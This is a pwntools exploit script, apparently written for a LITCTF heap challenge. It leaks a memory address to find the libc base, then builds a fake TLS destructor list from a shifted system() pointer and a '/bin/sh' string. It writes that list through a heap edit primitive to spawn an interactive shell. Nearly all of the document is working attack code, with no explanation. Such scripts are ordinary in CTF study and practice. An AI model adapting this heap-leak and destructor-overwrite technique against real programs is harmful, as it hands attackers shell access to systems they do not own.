from pwn import *
elf = context.binary = ELF("./main_patched")
context.log_level = "Debug"

libc = ELF("./libc.so.6")
io = process()
# io= remote("litctf.org" ,31778)
gdb.attach(io)
def malloc(index,size):
    io.sendlineafter(b">",b"1")
    io.sendlineafter(b"Idx?",str(index))
    io.sendlineafter(b"Size?",str(size))

def free(index):
    io.sendlineafter(b">",b"2")
    io.sendlineafter(b"Idx?",str(index))

def view(index):
    io.sendlineafter(b">",b"3")
    io.sendlineafter(b"Idx?",str(index))

def edit(index,payload):
    io.sendlineafter(b">",b"4")
    io.sendlineafter(b"Idx?",str(index))
    io.sendlineafter(b"Content?",payload)

malloc(0x0,0x100)
malloc(0x1,1023)

free(0x1)
view(0x0)
io.recvuntil(b"content: ")

anon = (unpack(io.recvn(0x6),"all"))-0x318
libc.address = anon+0x10000
# one_gadget = [0xe3afe,0xe3b01,0xe3b04]


print(f"anon leak = {hex(anon)}")
print(f"libc_base = {hex(libc.address)}")




# tls = libc.address+0x1f3540
tls = anon+0x740

# one_gadget = [0xe3afe,0xe3b01,0xe3b04]
# system = (libc.address+one_gadget[1])<<17
bin_sh = libc.address +0x1b45bd
system = libc.sym['system']<<17

fake_dtor_list = b"\x00"*0x4
fake_dtor_list +=  pack(tls-0x80+0x30)
fake_dtor_list += pack(system)
fake_dtor_list += pack(bin_sh)
fake_dtor_list += pack(0)*8
fake_dtor_list += pack(libc.address+0x1f3540)+pack(libc.address+0x1f3ea0)+pack(libc.address+0x1f3540)
fake_dtor_list += pack(0)*4

edit(0x0,pack(tls-0x80+0x20))
malloc(0x1,1023)
edit(0x1,fake_dtor_list)

#tls dtor overwrite

# io.sendlineafter(b">",b"0")





















io.interactive()
